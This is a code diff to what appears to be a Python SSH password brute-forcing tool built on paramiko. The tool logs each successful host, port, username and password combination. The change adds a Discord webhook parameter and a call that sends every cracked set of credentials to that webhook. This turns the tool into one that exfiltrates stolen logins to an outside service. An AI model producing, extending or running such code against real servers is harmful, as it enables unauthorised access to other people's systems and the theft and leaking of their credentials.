@@ -3,6 +3,7 @@ import socket
 import threading
 import paramiko
 import concurrent.futures
+from discord.webhook import webhook
 
 logger = logging.getLogger("paramiko")
 logger.setLevel(logging.CRITICAL)  # Suppress all but critical errors
@@ -11,10 +12,13 @@ while logger.hasHandlers():
 
 
 class SSH_Client:
-    def __init__(self, host: str, port: str, error_verbose: bool) -> None:
+    def __init__(
+        self, host: str, port: str, error_verbose: bool, webhook_url: str
+    ) -> None:
         self.host, self.port = host, int(port)
 
         self.error_verbose = error_verbose
+        self.webhook_url = webhook_url
 
         self.stop_event = threading.Event()
 
@@ -42,6 +46,9 @@ class SSH_Client:
             # If the connection is successful, print login details
             login = f"{self.host}:{self.port}:{username}:{password}"
             print("Login successful:", login)
+
+            if self.webhook_url != "":
+                webhook(self.webhook_url, self.host, self.port, username, password)
 
             self.result = login
 
